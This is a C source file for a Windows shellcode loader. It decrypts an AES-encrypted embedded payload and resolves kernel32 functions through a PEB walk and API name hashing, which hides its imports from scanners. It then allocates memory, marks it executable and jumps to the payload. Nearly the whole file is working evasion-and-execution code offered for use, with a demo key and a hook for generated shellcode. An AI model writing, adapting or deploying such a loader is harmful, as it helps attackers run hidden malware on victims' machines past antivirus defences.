#include <windows.h>
#include "../common/aes.h"

struct {
    unsigned char aes_key[16];
    unsigned char aes_iv[16];
    unsigned char data[4*1024*1024];
    int len;
} sc = { "Hello, World!" };

#define Kernel32Lib_Hash 0x1cca9ce6

#define GetProcAddress_Hash 0x1AB9B854
typedef void* (WINAPI* _GetProcAddress)(HMODULE hModule, char* funcName);

#define LoadLibraryA_Hash 0x7F201F78
typedef HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);

#define VirtualAlloc_Hash 0x5E893462
typedef LPVOID(WINAPI* _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

#define VirtualProtect_Hash 1819198468
typedef BOOL(WINAPI* _VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

#define Sleep_Hash 1065713747
typedef VOID(WINAPI* _Sleep)(DWORD dwMilliseconds);

typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
typedef struct _LDR_DATA_TABLE_ENTRY {
    // LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first
    // entry.
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDataStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

// WinDbg> dt -v ntdll!_PEB_LDR_DATA
typedef struct _PEB_LDR_DATA { //, 7 elements, 0x28 bytes
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

// WinDbg> dt -v ntdll!_PEB_FREE_BLOCK
typedef struct _PEB_FREE_BLOCK { // 2 elements, 0x8 bytes
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

// struct _PEB is defined in Winternl.h but it is incomplete
// WinDbg> dt -v ntdll!_PEB
typedef struct __PEB { // 65 elements, 0x210 bytes
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

// BKDRHash
inline uint32_t calc_hash(const char* str)
{
    uint32_t seed = 131; // 31 131 1313 13131 131313 etc..
    uint32_t hash = 0;
    while (*str) {
        hash = hash * seed + (*str++);
    }
    return (hash & 0x7FFFFFFF);
}

inline uint32_t calc_hashW2(const wchar_t* str, int len)
{
    uint32_t seed = 131;  // 31 131 1313 13131 131313 etc..
    uint32_t hash = 0;
    for (int i = 0; i < len; ++i) {
        wchar_t s = *str++;
        if (s >= 'a') s = s - 0x20;
        hash = hash * seed + s;
    }
    return (hash & 0x7FFFFFFF);
}

inline HMODULE get_kernel32_base()
{
    _PPEB peb = NULL;
#ifdef _WIN64
    peb = (_PPEB)__readgsqword(0x60);
#else
    peb = (_PPEB)__readfsdword(0x30);
#endif
    LIST_ENTRY* entry = peb->pLdr->InMemoryOrderModuleList.Flink;
    while (entry) {
        PLDR_DATA_TABLE_ENTRY e = (PLDR_DATA_TABLE_ENTRY)entry;
        if (calc_hashW2(e->BaseDllName.pBuffer, e->BaseDllName.Length / 2) == Kernel32Lib_Hash) {
            return (HMODULE)e->DllBase;
        }
        entry = entry->Flink;
    }
    return 0;
};

#define cast(t, a) ((t)(a))
#define cast_offset(t, p, o) ((t)((uint8_t *)(p) + (o)))

void* get_proc_address_from_hash(HMODULE module, uint32_t func_hash, _GetProcAddress get_proc_address)
{
    PIMAGE_DOS_HEADER dosh = cast(PIMAGE_DOS_HEADER, module);
    PIMAGE_NT_HEADERS nth = cast_offset(PIMAGE_NT_HEADERS, module, dosh->e_lfanew);
    PIMAGE_DATA_DIRECTORY dataDict = &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (dataDict->VirtualAddress == 0 || dataDict->Size == 0) return 0;
    PIMAGE_EXPORT_DIRECTORY exportDict = cast_offset(PIMAGE_EXPORT_DIRECTORY, module, dataDict->VirtualAddress);
    if (exportDict->NumberOfNames == 0) return 0;
    uint32_t* fn = cast_offset(uint32_t*, module, exportDict->AddressOfNames);
    uint32_t* fa = cast_offset(uint32_t*, module, exportDict->AddressOfFunctions);
    uint16_t* ord = cast_offset(uint16_t*, module, exportDict->AddressOfNameOrdinals);
    for (uint32_t i = 0; i < exportDict->NumberOfNames; i++) {
        char* name = cast_offset(char*, module, fn[i]);
        uint32_t hash = calc_hash(name);
        if (hash != func_hash) continue;
        return get_proc_address == 0 ? cast_offset(void*, module, fa[ord[i]]) : get_proc_address(module, name);
    }
    return 0;
}

inline void* mc(void* dest, const void* src, size_t n)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (n--)
        *d++ = *s++;
    return dest;
}

// A simple shell code loader.
// Copy left (c) yuanyuanxiang.
#ifdef _DEBUG
// Tip: Use menu to generate TinyRun.c.
#ifdef _WIN64
#include "../x64/Release/TinyRun.c"
#else
#include "../Release/TinyRun.c"
#endif
int main()
{
    sc.len = Shellcode_len;
    if (sc.len > sizeof(sc.data)) return -1;
    memcpy(sc.data, Shellcode, sc.len);
    memcpy(sc.aes_iv, "It is a example", 16);
    memcpy(sc.aes_key, "It is a example", 16);
#else
int entry()
{
#endif
    if (!sc.data[0] || !sc.len)
        return -1;

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, sc.aes_key, sc.aes_iv);
    AES_CBC_decrypt_buffer(&ctx, sc.data, sc.len);

    HMODULE kernel32 = get_kernel32_base();
    if (!kernel32) return -2;
    _GetProcAddress GetProcAddress = (_GetProcAddress)get_proc_address_from_hash(kernel32, GetProcAddress_Hash, 0);
    _LoadLibraryA LoadLibraryA = (_LoadLibraryA)get_proc_address_from_hash(kernel32, LoadLibraryA_Hash, GetProcAddress);
    _VirtualAlloc VirtualAlloc = (_VirtualAlloc)get_proc_address_from_hash(kernel32, VirtualAlloc_Hash, GetProcAddress);
    _VirtualProtect VirtualProtect = (_VirtualProtect)get_proc_address_from_hash(kernel32, VirtualProtect_Hash, GetProcAddress);
    _Sleep Sleep = (_Sleep)get_proc_address_from_hash(kernel32, Sleep_Hash, GetProcAddress);
    void* exec = VirtualAlloc(NULL, sc.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec) {
        mc(exec, sc.data, sc.len);
        DWORD oldProtect = 0;
        if (!VirtualProtect(exec, sc.len, PAGE_EXECUTE_READ, &oldProtect)) return -3;
        ((void(*)())exec)();
        Sleep(INFINITE);
    }
    return 0;
}
